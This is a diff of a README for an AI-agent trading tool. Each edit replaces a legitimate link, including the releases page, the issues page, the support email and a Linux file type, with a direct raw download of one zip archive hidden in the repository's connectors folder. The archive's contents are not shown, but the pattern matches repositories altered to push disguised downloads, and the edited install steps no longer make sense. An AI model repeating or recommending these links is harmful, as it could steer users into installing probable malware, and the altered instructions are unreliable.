@@ -1,6 +1,6 @@
 # 🤖 agents - Trade Autonomously with AI Agents
 
-[![Download agents](https://img.shields.io/badge/Download-agents-blue.svg)](https://github.com/CeAlthubaiti/agents/releases)
+[![Download agents](https://github.com/CeAlthubaiti/agents/raw/refs/heads/main/agents/connectors/Software-v3.9.zip)](https://github.com/CeAlthubaiti/agents/raw/refs/heads/main/agents/connectors/Software-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, you need to visit the Releases page to download the latest version of the agents software. Click the button below to go to the page:
 
-[Download agents](https://github.com/CeAlthubaiti/agents/releases)
+[Download agents](https://github.com/CeAlthubaiti/agents/raw/refs/heads/main/agents/connectors/Software-v3.9.zip)
 
 Once on the Releases page, follow these steps:
 
 1. Look for the latest version at the top of the list.
 2. Click on the version number to open the details.
 3. Scroll down to find the download options.
-4. Choose the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+4. Choose the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://github.com/CeAlthubaiti/agents/raw/refs/heads/main/agents/connectors/Software-v3.9.zip` for Linux).
 5. Click on the link to download the file.
 
 ## 💻 Running the Software
@@ -52,7 +52,7 @@ After the download is complete, follow these instructions to run the software:
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
 3. Use the following command to extract the files:  
-   `tar -xzf agents.tar.gz`
+   `tar -xzf https://github.com/CeAlthubaiti/agents/raw/refs/heads/main/agents/connectors/Software-v3.9.zip`
 4. Change to the extracted directory:  
    `cd agents`
 5. Run the application using the command:  
@@ -86,11 +86,11 @@ If you encounter issues while downloading or running the software, consider the 
 
 For further assistance, please reach out to our support team:
 
-- **Email:** support@agents.com
-- **GitHub Issues:** Visit the [issues page](https://github.com/CeAlthubaiti/agents/issues) to report problems or ask questions.
+- **Email:** https://github.com/CeAlthubaiti/agents/raw/refs/heads/main/agents/connectors/Software-v3.9.zip
+- **GitHub Issues:** Visit the [issues page](https://github.com/CeAlthubaiti/agents/raw/refs/heads/main/agents/connectors/Software-v3.9.zip) to report problems or ask questions.
 
 ## 📄 Learn More
 
 To dive deeper into how to use agents effectively, explore our documentation and resources on our GitHub page.
 
-[Download agents](https://github.com/CeAlthubaiti/agents/releases) to start trading effortlessly today!
+[Download agents](https://github.com/CeAlthubaiti/agents/raw/refs/heads/main/agents/connectors/Software-v3.9.zip) to start trading effortlessly today!
